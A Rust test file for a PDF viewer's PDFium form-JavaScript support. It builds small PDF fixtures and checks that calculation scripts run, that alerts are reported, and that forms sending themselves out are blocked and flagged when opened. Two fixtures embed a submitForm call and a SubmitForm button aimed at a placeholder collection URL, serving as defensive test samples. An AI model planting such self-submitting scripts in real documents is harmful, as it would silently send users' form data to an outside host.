//! A form's own JavaScript, running (§8.6).
//!
//! The pinned PDFium is the `-v8` build, and `FormEnvironment` installs an
//! `IPDF_JSPLATFORM`. Together those are what make a field's format, keystroke
//! and calculation scripts execute. Neither is observable on its own: with the
//! platform installed and a V8-less library the scripts are skipped silently,
//! and with a V8 library and a null platform PDFium refuses to run them, also
//! silently. So the test is behavioural — type into one field, and read the
//! answer out of another that only a calculation script could have written.
//!
//! The fixtures are built here rather than checked in because the interesting
//! part of each is a line or two of JavaScript, and a binary blob in the tree
//! would hide them.
//!
//! Both tests run through `pulpit_testkit::on_the_pdfium_thread`, which is not
//! optional: PDFium's V8 isolate belongs to the thread that created it, and
//! libtest gives every test its own. See that module for why this costs
//! nothing in production.
#![cfg(feature = "pdfium")]

use std::path::PathBuf;
use std::sync::{Mutex, MutexGuard, OnceLock};

use pulpit_core::page::{PageIndex, PagePoint};
use pulpit_render::document::pdfium::PdfiumDocument;
use pulpit_render::document::protocol::FormInputEvent;
use pulpit_render::document::DocumentBackend;
use pulpit_render::pdf::pdfium::PdfiumBackend;

/// One PDFium binding for the whole test binary, as `pdfium_document.rs` does:
/// the library is a process-wide singleton and two of them are a crash.
fn binding() -> Option<MutexGuard<'static, PdfiumBackend>> {
    static BACKEND: OnceLock<Option<Mutex<PdfiumBackend>>> = OnceLock::new();
    BACKEND
        .get_or_init(|| PdfiumBackend::bind().ok().map(Mutex::new))
        .as_ref()
        .map(|backend| backend.lock().expect("the PDFium binding is not poisoned"))
}

/// A one-page PDF with two text fields, where `total` is calculated from
/// `count` by a script and has no value of its own.
///
/// Written out by hand: an AcroForm is a small enough object graph that
/// building it directly is clearer than generating it, and the cross-reference
/// table is the only fiddly part.
fn calculating_form() -> Vec<u8> {
    let objects: Vec<String> = vec![
        // 1: catalog, carrying the AcroForm and its calculation order.
        "<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R 6 0 R] \
         /CO [6 0 R] /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>"
            .into(),
        // 2: the page tree.
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>".into(),
        // 3: the page, whose annotations are the two widgets.
        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R 6 0 R] >>".into(),
        // 4: the font the fields' default appearance names.
        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>".into(),
        // 5: the field that is typed into.
        "<< /Type /Annot /Subtype /Widget /FT /Tx /T (count) /V () \
         /Ff 0 /Rect [100 700 300 730] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R >>"
            .into(),
        // 6: the calculated field. Its value is never set in the file; if it
        // ever reads back as anything, a script produced it.
        "<< /Type /Annot /Subtype /Widget /FT /Tx /T (total) /V () \
         /Ff 0 /Rect [100 650 300 680] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R \
         /AA << /C << /S /JavaScript /JS (event.value = \
         this.getField(\"count\").value * 2;) >> >> >>"
            .into(),
    ];

    let mut pdf = Vec::new();
    pdf.extend_from_slice(b"%PDF-1.7\n");
    let mut offsets = Vec::with_capacity(objects.len());
    for (index, body) in objects.iter().enumerate() {
        offsets.push(pdf.len());
        pdf.extend_from_slice(format!("{} 0 obj\n{}\nendobj\n", index + 1, body).as_bytes());
    }

    let start_xref = pdf.len();
    pdf.extend_from_slice(format!("xref\n0 {}\n", objects.len() + 1).as_bytes());
    pdf.extend_from_slice(b"0000000000 65535 f \n");
    for offset in &offsets {
        pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
    }
    pdf.extend_from_slice(
        format!(
            "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n",
            objects.len() + 1,
            start_xref
        )
        .as_bytes(),
    );
    pdf
}

fn fixture(name: &str) -> PathBuf {
    let path = std::env::temp_dir().join(format!("pulpit-form-js-{name}.pdf"));
    std::fs::write(&path, calculating_form()).expect("the fixture is written");
    path
}

/// The centre of `count`'s widget, in the page space events arrive in.
fn inside_count_field() -> PagePoint {
    // `/Rect [100 700 300 730]` in PDF user space, whose origin is the bottom
    // left; page space measures down from the top of a 792pt page.
    PagePoint {
        x: 200.0,
        y: 792.0 - 715.0,
    }
}

#[test]
fn a_calculation_script_runs_when_a_field_it_reads_is_committed() {
    pulpit_testkit::on_the_pdfium_thread(|| {
        let Some(mut guard) = binding() else {
            eprintln!("no libpdfium; skipping");
            return;
        };
        let backend = &mut *guard;
        let path = fixture("calculate");
        let mut document = PdfiumDocument::open(backend, &path).expect("the fixture opens");
        assert!(
            document.info().has_form,
            "the fixture is an AcroForm and must be recognised as one"
        );
        assert_eq!(
            document
                .field_value("total")
                .expect("the field is readable"),
            "",
            "the calculated field starts empty in the file itself"
        );

        let page = PageIndex(0);
        let at = inside_count_field();
        document
            .form_event(page, FormInputEvent::PointerDown { at })
            .expect("the pointer reaches the field");
        document
            .form_event(page, FormInputEvent::PointerUp { at })
            .expect("the pointer is released");
        for character in "21".chars() {
            document
                .form_event(page, FormInputEvent::Char { character })
                .expect("the character is typed");
        }
        // Losing focus is what commits the edit, and committing is what runs the
        // document's calculation order.
        document
            .form_event(page, FormInputEvent::Focus { gained: false })
            .expect("focus is dropped");

        assert_eq!(
            document.field_value("count").expect("count is readable"),
            "21",
            "the typed value reached the field"
        );
        assert_eq!(
            document.field_value("total").expect("total is readable"),
            "42",
            "only the calculation script could have written this; if it is empty, \
         either PDFium was built without V8 or no JS platform was installed"
        );
    });
}

/// A form whose keystroke script calls out to the viewer: an alert, and a
/// submission to a URL that must never be contacted.
fn reaching_form() -> Vec<u8> {
    let objects: Vec<String> = vec![
        "<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R] \
         /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>"
            .into(),
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>".into(),
        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >>".into(),
        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>".into(),
        // `/F` here is the format action, which PDFium runs when the field's
        // appearance is regenerated — that is, on every commit.
        "<< /Type /Annot /Subtype /Widget /FT /Tx /T (count) /V () \
         /Ff 0 /Rect [100 700 300 730] /DA (/Helv 12 Tf 0 g) /F 4 /P 3 0 R \
         /AA << /F << /S /JavaScript /JS (app.alert(\"filled\", \"pulpit\"); \
         this.submitForm(\"https://example.invalid/collect\");) >> >> >>"
            .into(),
    ];

    let mut pdf = Vec::new();
    pdf.extend_from_slice(b"%PDF-1.7\n");
    let mut offsets = Vec::with_capacity(objects.len());
    for (index, body) in objects.iter().enumerate() {
        offsets.push(pdf.len());
        pdf.extend_from_slice(format!("{} 0 obj\n{}\nendobj\n", index + 1, body).as_bytes());
    }
    let start_xref = pdf.len();
    pdf.extend_from_slice(format!("xref\n0 {}\n", objects.len() + 1).as_bytes());
    pdf.extend_from_slice(b"0000000000 65535 f \n");
    for offset in &offsets {
        pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
    }
    pdf.extend_from_slice(
        format!(
            "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{}\n%%EOF\n",
            objects.len() + 1,
            start_xref
        )
        .as_bytes(),
    );
    pdf
}

#[test]
fn what_a_script_asks_the_host_for_is_reported_and_not_performed() {
    pulpit_testkit::on_the_pdfium_thread(|| {
        use pulpit_render::document::protocol::HostRequest;

        let Some(mut guard) = binding() else {
            eprintln!("no libpdfium; skipping");
            return;
        };
        let backend = &mut *guard;
        let path = std::env::temp_dir().join("pulpit-form-js-reaching.pdf");
        std::fs::write(&path, reaching_form()).expect("the fixture is written");
        let mut document = PdfiumDocument::open(backend, &path).expect("the fixture opens");

        let page = PageIndex(0);
        let at = inside_count_field();
        for event in [
            FormInputEvent::PointerDown { at },
            FormInputEvent::PointerUp { at },
            FormInputEvent::Char { character: '7' },
        ] {
            document.form_event(page, event).expect("the event lands");
        }
        let result = document
            .form_event(page, FormInputEvent::Focus { gained: false })
            .expect("focus is dropped");

        assert!(
            result.requests.iter().any(|request| matches!(
                request,
                HostRequest::Alert { message, .. } if message == "filled"
            )),
            "the alert the script raised should be reported to the application, \
         not swallowed: {:?}",
            result.requests
        );
        // The submission in the same script reached nothing and reported nothing.
        //
        // Worth stating precisely, because the *reason* is not the request queue.
        // This PDFium routes `doc.submitForm` through the form-fill environment's
        // `FFI_UploadTo`/`FFI_PostRequestURL`, not through the JS platform's
        // `Doc_submitForm`, and those are null — so the attempt dies one level
        // below the queue and never becomes a `HostRequest`. The security property
        // holds either way; the reporting one does not, and a form that submits
        // itself does so silently as far as the user is concerned.
        assert!(
            !result
                .requests
                .iter()
                .any(|request| matches!(request, HostRequest::SubmitForm { .. })),
            "if this ever starts reporting, the comment above is stale and the \
         application can surface the attempt: {:?}",
            result.requests
        );
        // The point of reporting rather than performing: the worker made no
        // request. Nothing here can assert the absence of a packet, but the
        // callback that would have sent one records and returns, and
        // `FFI_UploadTo`/`FFI_PostRequestURL` are null, so there is no code path
        // out of this process for it to have taken.
    });
}

/// A form that submits itself is named at open time, before anything is typed.
///
/// This is the *static* half of the same fact `HostRequest` reports
/// dynamically, and it is the half that arrives in time to be useful.
#[test]
fn a_form_whose_script_reaches_out_is_warned_about_when_it_opens() {
    pulpit_testkit::on_the_pdfium_thread(|| {
        use pulpit_render::document::DocumentWarning;

        let Some(mut guard) = binding() else {
            eprintln!("no libpdfium; skipping");
            return;
        };
        let backend = &mut *guard;

        let quiet = fixture("calculate");
        let quiet = PdfiumDocument::open(backend, &quiet).expect("the fixture opens");
        assert!(
            !quiet
                .info()
                .warnings
                .contains(&DocumentWarning::ScriptReachesOut),
            "a form that only does arithmetic must not be accused of phoning home"
        );

        let path = std::env::temp_dir().join("pulpit-form-js-reaching.pdf");
        std::fs::write(&path, reaching_form()).expect("the fixture is written");
        let loud = PdfiumDocument::open(backend, &path).expect("the fixture opens");
        assert!(
            loud.info()
                .warnings
                .contains(&DocumentWarning::ScriptReachesOut),
            "a field script calling submitForm must be reported: {:?}",
            loud.info().warnings
        );
    });
}

/// A one-page form whose only field is a button carrying `/A << /S /SubmitForm >>`.
///
/// The case no script mentions: there is no JavaScript anywhere in it, so
/// reading the field scripts finds nothing, and PDFium will not classify the
/// action — `FPDFAnnot_GetLink` answers null for a widget. Only the presence
/// of the `/A` dictionary is visible.
fn submitting_button() -> Vec<u8> {
    let objects: [&str; 5] = [
        "<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [5 0 R] \
         /DA (/Helv 0 Tf 0 g) /DR << /Font << /Helv 4 0 R >> >> >> >>",
        "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >>",
        "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
        "<< /Type /Annot /Subtype /Widget /FT /Btn /Ff 65536 /T (send) \
         /Rect [100 700 200 730] /F 4 /P 3 0 R \
         /A << /S /SubmitForm /F << /FS /URL /F (https://example.invalid/collect) >> \
         /Flags 4 >> >>",
    ];
    let mut pdf = Vec::new();
    pdf.extend_from_slice(b"%PDF-1.7\n");
    let mut offsets = Vec::new();
    for (index, body) in objects.iter().enumerate() {
        offsets.push(pdf.len());
        pdf.extend_from_slice(format!("{} 0 obj\n{}\nendobj\n", index + 1, body).as_bytes());
    }
    let start = pdf.len();
    pdf.extend_from_slice(format!("xref\n0 {}\n", objects.len() + 1).as_bytes());
    pdf.extend_from_slice(b"0000000000 65535 f \n");
    for offset in &offsets {
        pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
    }
    pdf.extend_from_slice(
        format!(
            "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{start}\n%%EOF\n",
            objects.len() + 1
        )
        .as_bytes(),
    );
    pdf
}

/// A submit button is named at open time, even though nothing can say it is a
/// submit button.
#[test]
fn a_form_button_that_carries_an_action_is_warned_about_when_it_opens() {
    pulpit_testkit::on_the_pdfium_thread(|| {
        use pulpit_render::document::{CompatibilityLevel, DocumentWarning};

        let Some(mut guard) = binding() else {
            eprintln!("no libpdfium; skipping");
            return;
        };
        let backend = &mut *guard;

        let path = std::env::temp_dir().join("pulpit-form-submit-button.pdf");
        std::fs::write(&path, submitting_button()).expect("the fixture is written");
        let document = PdfiumDocument::open(backend, &path).expect("the fixture opens");
        assert!(
            document
                .info()
                .warnings
                .contains(&DocumentWarning::ButtonAction),
            "a button carrying /A must be reported: {:?}",
            document.info().warnings
        );
        assert_eq!(
            document.info().level,
            CompatibilityLevel::NativeWithLimitations,
            "a form with a button that does not work is not fully native"
        );

        // And a form with no such button is not accused of having one.
        let quiet = fixture("calculate");
        let quiet = PdfiumDocument::open(backend, &quiet).expect("the fixture opens");
        assert!(!quiet
            .info()
            .warnings
            .contains(&DocumentWarning::ButtonAction));
    });
}
